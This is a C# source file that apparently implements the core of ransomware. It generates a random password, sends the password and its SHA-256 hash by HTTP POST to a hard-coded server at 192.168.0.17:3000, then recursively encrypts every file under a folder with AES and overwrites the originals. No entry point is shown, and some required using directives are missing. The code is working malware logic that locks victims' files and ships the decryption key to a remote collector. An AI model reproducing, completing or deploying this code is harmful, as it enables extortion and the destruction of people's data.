using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Linq;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Threading;

class Program
{
    private static readonly Random random = new Random();
    static string GenerateRandomPassword(int length)
    {
        const string validChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
        var password = new StringBuilder(length);

        for (int i = 0; i < length; i++)
        {
            password.Append(validChars[random.Next(validChars.Length)]);
        }

        return password.ToString();
    }

    

    static string ComputeHash(string input)
    {
        using (var sha256Hash = SHA256.Create())
        {
            byte[] bytes = sha256Hash.ComputeHash(Encoding.UTF8.GetBytes(input));
            return BitConverter.ToString(bytes).Replace("-", "").ToLowerInvariant();
        }
    }

    static async Task SendPasswordToServerAsync(string password, string hashedPassword)
    {
        string serverIP = "192.168.0.17"; // Server IP address or domain
        int port = 3000;

        using (var client = new HttpClient())
        {
            client.BaseAddress = new Uri($"http://{serverIP}:{port}");

            var postData = new List<KeyValuePair<string, string>>
            {
                new KeyValuePair<string, string>("password", password),
                new KeyValuePair<string, string>("hashedPassword", hashedPassword)
            };

            try
            {
                var response = await client.PostAsync("/submit-key", new FormUrlEncodedContent(postData));

                if (response.IsSuccessStatusCode)
                {
                    string responseData = await response.Content.ReadAsStringAsync();
                    Console.WriteLine($"Server response: {responseData}");
                }
                else
                {
                    Console.WriteLine($"Error sending data to server: {response.StatusCode}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error sending data to server: {ex.Message}");
            }
        }
    }

    static void EncryptFolder(string folderPath, string password, string hashFilePath, List<string> excludedExtensions)
    {
        try
        {
            // Encrypt files in the current folder
            var files = Directory.GetFiles(folderPath);
            Parallel.ForEach(files, file =>
            {
                if (file != hashFilePath && !excludedExtensions.Contains(Path.GetExtension(file)))
                {
                    try
                    {
                        EncryptFile(file, password);
                    }
                    catch (UnauthorizedAccessException)
                    {
                        Console.WriteLine($"Access denied for file: {file}. Skipping...");
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"An error occurred with file: {file}. Error: {ex.Message}");
                    }
                }
            });

            // Recursively encrypt files in all subdirectories
            var subdirectories = Directory.GetDirectories(folderPath);
            foreach (var directory in subdirectories)
            {
                EncryptFolder(directory, password, hashFilePath, excludedExtensions);
            }

            Console.WriteLine($"Encryption complete for folder: {folderPath}");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"An error occurred: {ex.Message}");
        }
    }

    static void EncryptFile(string filePath, string password)
    {
        byte[] header = Encoding.UTF8.GetBytes("EncryptedFile00");
        byte[] existingHeader = new byte[header.Length];

        // Check if the file is already encrypted
        using (var inputFile = File.OpenRead(filePath))
        {
            if (inputFile.Length > existingHeader.Length)
            {
                inputFile.Read(existingHeader, 0, existingHeader.Length);
                if (existingHeader.SequenceEqual(header))
                {
                    Console.WriteLine($"File {filePath} is already encrypted. Skipping...");
                    return;
                }
            }
        }

        // Proceed with encryption
        byte[] salt = new byte[16];
        new RNGCryptoServiceProvider().GetBytes(salt);
        var key = new Rfc2898DeriveBytes(password, salt, 10000).GetBytes(32);

        string tempFilePath = $"{filePath}.tmp"; // Temporary file for encrypted content

        using (var symmetricKey = new RijndaelManaged { KeySize = 256, BlockSize = 128, Padding = PaddingMode.Zeros })
        using (var inputFile = File.OpenRead(filePath))
        using (var outputFile = File.Create(tempFilePath))
        {
            // Write header and salt to output file
            outputFile.Write(header, 0, header.Length);
            outputFile.Write(salt, 0, salt.Length);

            using (var cryptoStream = new CryptoStream(outputFile, symmetricKey.CreateEncryptor(key, new byte[16]), CryptoStreamMode.Write))
            {
                inputFile.CopyTo(cryptoStream);
            }
        }

        File.Replace(tempFilePath, filePath, null); // Replace the original file with the encrypted file
    }
}
